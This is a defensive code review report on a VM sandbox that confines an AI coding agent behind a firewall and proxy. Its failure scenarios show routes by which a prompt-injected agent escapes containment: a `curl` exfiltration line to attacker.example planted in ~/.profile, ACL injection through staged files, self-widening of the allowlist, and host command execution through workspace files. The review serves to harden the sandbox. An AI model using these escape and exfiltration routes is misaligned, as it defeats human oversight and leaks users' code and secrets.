# code-vm Code Review Findings

**Date:** 2026-07-31
**Scope:** the whole implementation as of commit `982c3c9` — Go packages under
`internal/` and `cmd/`, guest scripts under `internal/guest/files/`, the Lima
template, `test-vm-sandbox.sh`, `mise.toml`, and the CI workflow. The `docs/`
tree was excluded.
**Method:** workflow-backed review at high effort — parallel finders per
correctness angle, then an independent adversarial verifier per candidate
location. 35 agents; all ten findings below survived verification as
`CONFIRMED`. Line references were re-checked against the working tree after the
review completed.
**Status:** findings 6, 7 and 8 are **fixed** in `7b5209b`; finding 2 is **closed
by removal**. The rest are open. Each section below carries its own status line.

**Plus one issue the review did not surface.** `.sandbox-secrets.yaml` was read
from the agent-writable workspace and its `source:` values executed **on the
host** via `bash -c` (`ResolveSecrets` → `ExecHost`), so an agent that wrote that
file got host command execution on the next `code-vm` invocation in that
directory — the same class as finding 7 but categorically worse, because it fails
*outside* the VM boundary rather than inside it. It was inherited from the
container sandbox, which resolves secrets the same way.

Reviewing it also showed the mechanism's protection did not hold: rendered files
were `root:devuser 0444`, group-readable by the agent, and the generated deny
rules only match commands where the path appears as a separate token, which
`python -c` (allowed by the shipped profile) sidesteps. So the cost was a
host-execution hole and the benefit was a property that was not true.

**The mechanism was removed** rather than repaired, which also closed finding 2.
See *Credential injection — removed* in the design doc for what a replacement
must do differently.

## The pattern

Most findings are **regressions relative to the Docker sandbox**, not novel
bugs: places where porting a control from `entrypoint.sh` into
`sandbox-boot.service` silently dropped a property the container version had.
The two most serious still-open ones (1 and 4) are both of that shape. Finding 9
is a decision rather than a defect and is marked as such.

---

## 1. Agent-writable rc files execute pre-firewall at every boot

**`internal/guest/files/scripts/update-agent-clis.sh:20`** — severity: high

`run_as_agent` invokes `bash -lc`, a **login** shell, which sources
`/home/devuser/.profile` and `.bashrc`. Those files are owned by the agent and
writable by it during any normal session. `sandbox-boot.sh` runs this script
first, before `init-firewall.sh` — deliberately, because the installers need
egress — so anything in those rc files runs with **no iptables policy and no
Squid**.

*Failure scenario:* a prompt-injected agent appends
`curl -T /home/devuser/repos/secret.tar https://attacker.example/` to
`~/.profile`. On the next `code-vm stop` / `code-vm start`, that command runs
with completely unfiltered egress. The allowlist never sees the traffic and
`proxy-log` shows nothing.

*Fix direction:* drop `-l` (the explicit `env` block already supplies `HOME`,
`PATH`, and `XDG_RUNTIME_DIR`, so the login shell buys nothing), and/or make the
agent's shell rc files root-owned like the `.claude` tree. Dropping `-l` is the
cheap, targeted change.

## 2. Credential deny rules are lost on restart while the secrets persist

**`internal/session/credentials.go:18`**, with the consuming side at
**`internal/guest/files/scripts/lock-settings.sh:80`** — severity: high —
**CLOSED BY REMOVAL**

*Resolution:* credential injection was removed entirely (see the status note at
the top), so there are no deny rules and no rendered credential files whose
lifetimes could disagree. The `CRED_DENY` branch in `lock-settings.sh` is gone.
Had the mechanism been kept, this would still have needed a decision between
persisting the rules and removing the rendered files.

`denyRulesPath` lives under `/run/sandbox-secrets/`, which is tmpfs, but the
*rendered credential files* are written to the guest disk (`root:devuser 0444`)
and survive reboots. The two lifetimes disagree.

*Failure scenario:* a session in workspace A renders
`/home/devuser/.gradle/gradle.properties` and merges its deny rules. After a VM
restart, a session in workspace B runs `lock-settings.sh`, which finds no
`deny-rules.json` and writes `settings.json` **without** the deny patterns — the
credential file is still on disk and group-readable, and Claude Code may now
read it.

*Fix direction:* either persist the deny rules alongside the rendered files, or
have the render step remove rendered credentials whose deny rules are gone, so
the file and its protection share one lifetime.

## 3. Host GID collision leaves no `devuser` group and bricks the VM

**`internal/guest/files/scripts/provision-system.sh:24`** — severity: high
(availability)

`getent group "$AGENT_GID"` tests for a group with that **GID**, not one named
`devuser`. When the host user's primary GID already exists in the guest —
gid 100 (`users`) on many Linux distros, gid 20 on macOS hosts — `groupadd` is
skipped, so no group *named* `devuser` ever exists. Every later
`chown root:devuser` and `install -g devuser` then fails with "invalid group".

*Failure scenario:* a host user with GID 100 runs `code-vm start`.
`lock-settings.sh` dies at its first `chown` under `set -e`,
`/run/firewall-verify` is never written, and `limactl start` hangs until the
300 s readiness probe times out. The VM never becomes usable, with no clear
diagnostic.

*Note:* this did not surface during implementation only because the development
host's GID (1000) happens not to collide.

*Fix direction:* check `getent group "$AGENT_USER"` for the name, and derive the
group to use from the GID that is actually present rather than assuming the name.

## 4. Firewall self-verification fails open instead of closed

**`internal/guest/files/scripts/init-firewall.sh:251`** (verify file written) vs
**`:254`** (`VERIFY_OK` gate) — severity: high

The script writes `/run/firewall-verify` **before** it evaluates `VERIFY_OK` and
exits 1. The Lima readiness probe only checks that the file *exists*. In the
Docker sandbox the identical `exit 1` aborted `entrypoint.sh` under `set -e`, so
the container died and the agent never ran.

*Failure scenario:* a verification check stops matching (e.g. an iptables output
format change). `init-firewall.sh` exits 1 and `sandbox-boot.service` fails —
but the verify file already exists, the probe passes, `limactl start` reports
success, and `code-vm` runs Claude in a VM whose firewall failed its own
verification. Nothing host-side reads the file's *contents*; only the
informational `status` and `firewall` commands do.

*Fix direction:* write the verify file only after `VERIFY_OK` passes (and have
the probe or `ensureRunning` treat a failed `sandbox-boot.service` as fatal).
This restores the fail-closed property without weakening any check.

## 5. The gateway-REJECT check is satisfied by the Squid ACCEPT rule

**`internal/guest/files/scripts/init-firewall.sh:236`** — severity: medium

`gw_reject` greps for any line containing `owner UID match $AGENT_UID`. The
agent-to-Squid ACCEPT rule appended earlier (`:192`) matches that string too, so
the check reports `yes` whether or not the gateway REJECT rule exists.

*Failure scenario:* the REJECT rule is dropped by a refactor or an iptables
failure. `/run/firewall-verify` still says `AGENT_GATEWAY_REJECT=yes`, the suite
assertion still passes, and the agent can reach host services while both the
security suite and `code-vm status` report the protection as active.

*Fix direction:* match the rule specifically — include the target and the
gateway address in the grep, not just the UID-owner match.

## 6. Predictable `/tmp` staging paths allow ACL injection

**`internal/session/allowlist.go:111`**, same pattern at
**`internal/session/gitidentity.go:63`** — severity: medium — **FIXED in `7b5209b`**

*Fix as applied:* all three call sites (allowlist, git identity, credentials) now
go through `session.installContent`, which stages under
`/home/limaadmin/.code-vm-staging` — created `0700` and owned by the admin user,
so the agent cannot enter it — with a `crypto/rand` filename. It cannot be a
root-only directory because `limactl copy` authenticates as the Lima guest user.
`stage_test.go` pins the staging location, the mode, and the post-install
cleanup; the suite asserts the agent cannot read the staging directory.

Files are staged into the guest at deterministic, agent-writable paths:
`/tmp/10-<sha256-prefix>.conf` and `/tmp/code-vm-gitconfig`. Root then
`install`s them into place. The window between `limactl copy` and `install` is a
race the agent can win.

*Failure scenario:* an agent already running in the VM computes the workspace
hash, then rewrites the staged fragment with
`acl allowed_domains dstdomain .attacker.com` after the copy but before the
install. `squid -k reconfigure` loads attacker-chosen ACLs.

*Fix direction:* stage into a root-only directory (e.g. under `/run/sandbox/`
created `0700 root:root`), or use an unpredictable per-invocation filename.

## 7. `.sandbox-domains` is agent-authored input that widens the allowlist

**`internal/session/allowlist.go:81`** — severity: medium — **FIXED in `7b5209b`**

`ApplyAllowlist` reads `.sandbox-domains` from the workspace, which is mounted
writable and is exactly what the agent edits. An agent can therefore author its
own allowlist entry and have the next `code-vm` invocation install it as root.

*Failure scenario:* the agent writes `.attacker.example` into
`<workspace>/.sandbox-domains`; the next session installs it and reloads Squid,
after which repository contents and rendered credential values can be POSTed
out, with only a proxy-log line as evidence.

*Fix as applied:* `.sandbox-domains` support was **removed** rather than
mitigated. The host config's `extraDomains` is now the only source; it lives
outside every mount, `MountsExclude` refuses to run when a mount would expose
it, and entries are validated against a domain pattern before they can reach
`squid.conf`. `code-vm allow` replaces the per-project file as the way to add a
domain, applying it live via the fragment. The cost accepted: a project can no
longer record its required domains in its own repo for teammates.

## 8. Every firewall mode switch wipes the Squid audit log

**`internal/guest/files/scripts/init-firewall.sh:129`** — severity: medium — **FIXED in `7b5209b`**

`install -m 0644 -o proxy -g proxy /dev/null /var/log/squid/access.log`
truncates the log on every run, and `set-firewall-mode.sh` re-execs
`init-firewall.sh` — so switching modes destroys the audit trail.

*Fix as applied:* the log is created only when absent. This became a
prerequisite rather than a nicety once `code-vm allow` started reading denied
entries out of that log. The suite compares line counts across an
`audit` → `allowlist` round trip.

*Failure scenario:* a user sees suspicious denied requests and runs
`code-vm firewall audit` to investigate. The switch truncates `access.log`, and
`code-vm proxy-log denied` shows nothing — the evidence the switch was meant to
help inspect is gone.

*Fix direction:* create the log only when absent (`[ -f ] ||`), or rotate rather
than truncate.

## 9. The security suite is excluded from CI on a stale premise

**`.github/workflows/ci.yml:3`** — severity: medium; **plan decision worth revisiting**

CI runs `fmt-check`, `lint`, `test:unit`, and `build`, but not
`mise run test:vm`. The sibling Docker sandbox runs its security suite on every
push/PR (see the parent repo's `CLAUDE.md`). The stated reason — GitHub-hosted
runners lack nested KVM — is out of date: GitHub's Linux runners have exposed
`/dev/kvm` since 2023.

*Failure scenario:* a PR that reorders `sandbox-boot.sh` so the firewall never
applies, or breaks the settings lock, passes CI green and merges. It ships in
the next VM users provision.

*Fix direction:* add a second job that runs `mise run test:vm` on
`ubuntu-latest` and see whether KVM is actually available; keep it non-blocking
at first if runtime is a concern.

## 10. No post-firewall connectivity check at boot

**`internal/guest/files/scripts/sandbox-boot.sh:19`** — severity: low

The container `entrypoint.sh` curled `https://api.anthropic.com` after the
firewall closed and printed an explicit warning on failure. The VM boot sequence
ends at `init-firewall.sh` with no such check, so a firewall that passes *rule*
verification but breaks actual *connectivity* is silent.

*Failure scenario:* DNS breaks under the new rules — e.g. the LIMADNS DNAT
parsing yields no allow rules on a Lima version whose nat-chain format differs.
Every iptables self-check still passes, the verify file is written, `code-vm`
starts normally, and every Claude API call hangs with no startup diagnostic.

*Fix direction:* re-add the reachability probe as a final, non-fatal step with a
loud warning.

---

## Remaining triage order

Findings 6, 7 and 8 are fixed; 2 is closed by removal. What is left, in the order
I would take it:

1. **4** and **5** — self-verify defects; small, self-contained, and they restore
   guarantees the suite currently only appears to check.
2. **3** — one-line-class fix that prevents an unusable VM for a large class of
   hosts (any host user whose primary GID collides with a stock guest group).
3. **1** — drop `-l` from `run_as_agent`; removes an unfiltered-egress channel.
4. **10** — re-add the boot-time API reachability warning.
5. **9** — decide whether CI should run the VM suite now that GitHub runners
   expose KVM.
